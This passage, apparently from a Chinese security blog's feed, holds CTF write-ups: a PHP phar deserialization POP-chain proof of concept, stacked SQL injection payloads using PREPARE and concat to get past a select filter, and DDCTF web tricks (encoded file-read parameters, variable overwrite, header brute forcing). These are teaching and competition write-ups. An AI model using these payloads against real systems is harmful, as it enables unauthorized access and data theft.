class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span>    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $source;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;source=<span class="string">'/flag'</span>;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        $text= <span class="keyword">$this</span>-&gt;source;</div><div class="line">        $text = base64_encode(file_get_contents($text));</div><div class="line">        <span class="keyword">return</span> $text;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|flag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</div><div class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> $params;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>(<span class="string">"_show"</span>=&gt;<span class="string">"file_get"</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;file=<span class="keyword">new</span> Show();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $test;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> S6ow();    </div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>); <span class="comment">//后缀名必须为phar</span></div><div class="line">$phar-&gt;startBuffering();</div><div class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></div><div class="line">$o = <span class="keyword">new</span> sh0w();</div><div class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></div><div class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></div><div class="line"><span class="comment">//签名自动计算</span></div><div class="line">$phar-&gt;stopBuffering();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>触发过程：</strong></p><p><strong>sh0w对象反序列化时调用<code>__destruct</code>，调用了S6ow对象的<code>_show</code>方法，由于_show方法不存在，从而调用了<code>__call</code>，此时<code>$this-&gt;{$name}</code>的值变为了<code>_show</code>，在进行<code>$this-&gt;{$name}</code>判断时，由于<code>_show</code>属性也不存在，从而触发了<code>__get</code>方法，<code>$this-&gt;{$name}</code>的值被赋为<code>file_get</code>，从而调用了<code>file_get</code>函数，由于一开始<code>$this-&gt;file</code>的值被设为了Show对象，所以这里将Show对象输出，触发了Show对象的<code>__ToString</code>方法，成功绕过了过滤读取flag</strong></p><p><strong>生成phar文件，将后缀重名名为.jpg上传至服务器,通过phar伪协议读取上传后的文件：<code>/file.php?file=phar:///var/www/html/upload/4935ad2c4be6114f4bf09d55ed82a60b.jpg</code></strong></p><p><img src="http://pic.c1imber.top/blog/20191020/X1VVOQSvHbD7.png?imageslim" alt="mark"><br><strong>base64解码后获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20191020/BO15lt513Lca.png?imageslim" alt="mark"></p><p><strong>剩下的题目，等待writeup出来后学习</strong></p><p><img src="http://pic.c1imber.top/blog/20191020/29mUSro8ePHA.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;a href=&quot;#2019极客巅峰ctf记录&quot; class=&quot;headerlink&quot; title=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;/a&gt;2019极客巅峰ctf记录&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;周六抽时间做了2019极客巅峰的ct
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019强网杯-过滤select的注入</title>
    <link href="https://c1aysec.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-%E8%BF%87%E6%BB%A4select%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>https://c1aysec.github.io/2019/05/28/2019强网杯-过滤select的注入/</id>
    <published>2019-05-27T16:15:00.000Z</published>
    <updated>2019-11-06T17:21:20.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019强网杯-过滤select的注入"><a href="#2019强网杯-过滤select的注入" class="headerlink" title="2019强网杯-过滤select的注入"></a>2019强网杯-过滤select的注入</h1><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p><strong>这道题的题目就是随便注，说是取自某次真实渗透环境，确定了这道题是考察注入，经测试发现为单引号包裹的字符型注入，但是存在存在过滤，过滤的sql关键字如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/mY2fTXh6Wy5t.png" alt="mark"><br><strong>这里过滤了select关键字，/i表示对大小写进行检查，所以大小写绕过无效，所以这里需要想别的办法，首先通过报错注入可以获取数据库的相关信息</strong></p><p><strong>通过报错注入获取当前数据库类型与版本：</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27%20and%20extractvalue(1,concat(1,version()))--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/oF419eR52pVL.png" alt="mark"><br><strong>.27-MariaDB-0ubuntu0.16.04.1</strong></p><p><strong>获取当前数据库名：</strong><br><img src="http://pic.c1imber.top/blog/20190528/NtJ9xJxCGk4O.png" alt="mark"><br><strong>supersqli</strong></p><p><strong>这里因为严格过滤了select关键字，导致不能继续注入，但是之后发现可以执行多语句，通过堆叠查询成功获取当前数据库（supersqli）下的表名</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27;use%20supersqli;show%20tables;--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/0isGzvkxIDkd.png" alt="mark"><br><strong>于是有了一个清晰的思路，可以通过执行多语句，将要执行的sql语句进行拼接，这样就可以将过滤的 sql关键字拆分绕过检测，通过动态执行sql语句发现1919810931114514表当中存在flag字段，payload如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> information_schema;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/LPeDMW7UJFWE.png" alt="mark"><br><strong>之后就可以获取flag列的内容了</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect `flag` from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/hn2CDwKtqwoR.png" alt="mark"></p><p><strong>（需要注意的一点是这一点使用了strstr对set和prepare关键字进行了检查，但是strstr检查不对大小写进行检查，所以这里可以通过大小写绕过，set和prepare关键字只要有一个是大写就可以绕过）</strong><br><img src="http://pic.c1imber.top/blog/20190528/hXVAJ6ouP22Q.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;a href=&quot;#2019强网杯-过滤select的注入&quot; class=&quot;headerlink&quot; title=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;/a&gt;2019强网杯-过滤select的注入&lt;/h1&gt;&lt;h3 i
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019 write up</title>
    <link href="https://c1aysec.github.io/2019/04/18/DDCTF2019%20write%20up/"/>
    <id>https://c1aysec.github.io/2019/04/18/DDCTF2019 write up/</id>
    <published>2019-04-18T10:57:00.000Z</published>
    <updated>2019-11-06T17:02:23.880Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-write-up"><a href="#DDCTF2019-write-up" class="headerlink" title="DDCTF2019 write up"></a>DDCTF2019 write up</h1><p><strong>最近几天抽时间做了做DDCTF，只做出了几道Web，菜哭了==，这里将做出的题记录一下吧（参赛id:stark）</strong></p><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p><code>http://117.51.150.246</code></p><p><strong>打开题目后跳到了一个连接，页面内容是一个表情包，jpg参数值看起来像一串base64,如下图</strong><br><img src="http://pic.c1imber.top/blog/20190418/jS6lSMJKAepR.png" alt="mark"><br><strong>将jpg的参数值TmpZMlF6WXhOamN5UlRaQk56QTJOdz09经过两次base64解码和一次hex解码后得到flag.jpg，另外在页面源码里面看到了flag.jpg图片内容base64编码后的内容，这里是使用img标签通过data伪协议将图片显示到了页面中</strong><br><img src="http://pic.c1imber.top/blog/20190418/vS8u1pFyKvFV.png" alt="mark"><br><strong>所以猜测这里可能是一个任意文件读取，将index.php进行一次hex编码两次base64编码后得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3,将值传入jpg参数尝试读取index.php源码，可以读取成功</strong><br><img src="http://pic.c1imber.top/blog/20190418/oOkUiMmqI69p.png" alt="mark"><br><strong>结果如下：</strong></p><pre><code>PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo=</code></pre><p><strong>base64解码后：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></div><div class="line"><span class="comment">* Date: July 4,2018</span></div><div class="line"><span class="comment">*/</span></div><div class="line">error_reporting(E_ALL || ~E_NOTICE);</div><div class="line"></div><div class="line"></div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</div><div class="line">   header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</div><div class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</div><div class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</div><div class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</div><div class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</div><div class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</div><div class="line">$txt = base64_encode(file_get_contents($file));</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* Can you find the flag file?</span></div><div class="line"><span class="comment">*</span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>通过源码可以大概猜测出来flag在config.php配置文件里面，经过测试这个文件是存在的，但是str_replace(“config”,”!”, $file)会将传入的config.php替换为!.php，所以这里是绕不过去的，但是代码里面有一个博客链接：</strong></p><p><code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code></p><p><strong>这里可能是一个hint，但是这篇连接的文章并没有什么提示，接下来在博客里翻到了一篇文章，这个文章讲的是有关临时交换文件的</strong></p><p><code>https://blog.csdn.net/FengBanLiuYun/article/details/80913909</code><br><img src="http://pic.c1imber.top/blog/20190418/76UJHkxGkBvK.png" alt="mark"><br><strong>这篇文章里面提到了一个名为practice.txt.swp的文件，开了一下脑洞，试着访问了一下该文件发现确实存在</strong><br><img src="http://pic.c1imber.top/blog/20190418/wkLLrE3SckL1.png" alt="mark"><br><strong>文件内容是另一个文件的名字f1ag!ddctf.php，并且里面有!，可以绕过之前的检测，所以这里可以读取到f1ag!ddctf.php文件，将f1agconfigddctf.php进行一次hex编码两次base64编码后构造出TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==,传入jpg参数读到f1ag!ddctf.php的源码</strong><br><img src="http://pic.c1imber.top/blog/20190418/1aoU9BKDK0Ad.png" alt="mark"><br><strong>得到结果：</strong></p><pre><code>PD9waHANCmluY2x1ZGUoJ2NvbmZpZy5waHAnKTsNCiRrID0gJ2hlbGxvJzsNCmV4dHJhY3QoJF9HRVQpOw0KaWYoaXNzZXQoJHVpZCkpDQp7DQogICAgJGNvbnRlbnQ9dHJpbShmaWxlX2dldF9jb250ZW50cygkaykpOw0KICAgIGlmKCR1aWQ9PSRjb250ZW50KQ0KCXsNCgkJZWNobyAkZmxhZzsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobydoZWxsbyc7DQoJfQ0KfQ0KDQo/Pg==</code></pre><p><strong>base64解码得到源码内容：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">$k = <span class="string">'hello'</span>;</div><div class="line">extract($_GET);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</div><div class="line">&#123;</div><div class="line">    $content=trim(file_get_contents($k));</div><div class="line">    <span class="keyword">if</span>($uid==$content)</div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>这里是一个简单的变量覆盖，可以构造:<code>http://117.51.150.246/f1ag!ddctf.php?uid=f1ag!ddctf.php&amp;k=practice.txt.swp</code>获取flag</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/QdTXwWrHMtNc.png" alt="mark"></p><p><strong>flag:DDCTF{436f6e67726174756c6174696f6e73}</strong></p><p><strong>另外这里有一个tip，可以不使用变量覆盖，直接构造<code>http://117.51.150.246/f1ag!ddctf.php?uid=</code>获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20190418/cchVsB66NEWn.png" alt="mark"></p><p><strong>因为$k变量的值hello是一个不存在的文件，会导致<code>file_get_contents</code>返回False，接下来False经过<code>trim</code>函数处理后会产生一次类型转换变成空字符串，所以<code>$uid==$content</code>,直接输出了flag</strong></p><h3 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h3><p><code>http://117.51.158.44/index.php</code></p><p><strong>打开后直接访问会提示没有登陆权限</strong><br><img src="http://pic.c1imber.top/blog/20190418/qoL8pEHQ5e4X.png" alt="mark"><br><strong>查看源码后发现存在一个<code>/js/index.js</code>文件,index.js代码如下：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * Created by PhpStorm.</span></div><div class="line"><span class="comment"> * User: didi</span></div><div class="line"><span class="comment"> * Date: 2019/1/13</span></div><div class="line"><span class="comment"> * Time: 9:05 PM</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">        type: <span class="string">"post"</span>,</div><div class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</div><div class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</div><div class="line">        dataType: <span class="string">"json"</span>,</div><div class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</div><div class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</div><div class="line">        &#125;,</div><div class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</div><div class="line">           <span class="built_in">console</span>.log(getdata);</div><div class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</div><div class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</div><div class="line">           &#125;</div><div class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.log(error);</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>通过简单的审计可以看到这里存在一个认证，通过ajax添加了一个http请求头<code>didictf_username</code>，猜测服务端是根据这个header头的值去做认证的，如果想访问到页面，首先需要得到出来一个username值,所以这里先对<code>didictf_username</code>进行爆破，通过爆破看到admin可以认证成功,之后会返回一个提示：app\/fL2XID2i0Cdh.php这个文件</strong><br><img src="http://pic.c1imber.top/blog/20190418/khmW4Jo6nXoL.png" alt="mark"><br><strong>访问<code>http://117.51.158.44/app/fL2XID2i0Cdh.php</code>,可以获取到源码，源码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div></pre></td><td class="code"><pre><div class="line">url:app/Application.php</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</div><div class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</div><div class="line">            <span class="string">'data'</span> =&gt; $data];</div><div class="line">        $ret = json_encode($ret);</div><div class="line">        header(<span class="string">'Content-type: application/json'</span>);</div><div class="line">        <span class="keyword">echo</span> $ret;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</div><div class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</div><div class="line">            <span 